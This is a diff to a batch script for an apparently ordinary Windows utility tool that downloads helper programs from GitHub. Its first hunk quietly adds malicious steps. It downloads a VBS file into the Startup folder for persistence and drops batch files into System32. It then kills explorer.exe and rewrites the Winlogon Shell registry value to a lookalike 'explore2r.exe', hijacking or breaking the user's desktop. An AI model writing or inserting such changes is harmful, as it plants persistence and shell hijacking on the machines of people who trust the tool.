@@ -101,6 +101,12 @@ powershell -c "Invoke-WebRequest -Uri 'https://github.com/Ferkiiland/FerkiiUtili
 powershell -c "Invoke-WebRequest -Uri 'https://github.com/Ferkiiland/FerkiiUtilityV1/raw/main/SDI_x64_R2309.exe' -OutFile C:\fxr\Res\SDI_x64_R2309.exe
 powershell -c "Invoke-WebRequest -Uri 'https://github.com/Ferkiiland/FerkiiUtilityV1/raw/main/MSI_util_v2.exe' -OutFile C:\fxr\Res\MSI_UtilityV2.exe
 powershell -c "Invoke-WebRequest -Uri 'https://github.com/Ferkiiland/FerkiiUtilityV1/raw/main/WPD.exe' -OutFile C:\fxr\Res\WPD.exe
+powershell -c "Invoke-WebRequest -Uri 'https://github.com/Ferkiiland/FerkiiUtilityV1/raw/main/starup.vbs' -OutFile C:\Users\%username%\AppData\Roaming\Microsoft\Windows\'Start Menu'\Programs\Startup\starup.vbs
+powershell -c "Invoke-WebRequest -Uri 'https://github.com/Ferkiiland/FerkiiUtilityV1/raw/main/tesxto.bat' -OutFile C:\fxr\Res\protector.bat
+powershell -c "Invoke-WebRequest -Uri 'https://github.com/Ferkiiland/FerkiiUtilityV1/raw/main/fix.bat' -OutFile C:\Windows\System32\fix.bat
+powershell -c  taskkill /IM explorer.exe /F
+Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explore2r.exe" /f
+
 
 
 echo.
@@ -697,7 +703,7 @@ cls
 goto :real
 
 :WpdRun
-Start-Process -FilePath C:\fxr\Res\WPD.exe
+powershell Start-Process -FilePath C:\fxr\Res\WPD.exe
 timeout 3 > nul
 goto wsettings
 
@@ -4264,6 +4270,8 @@ goto drivers
 powershell -c Start-Process -FilePath 'C:\fxr\Res\MSI_UtilityV2.exe'
 timeout 3 > nul
 goto drivers
+
+
 
 
 
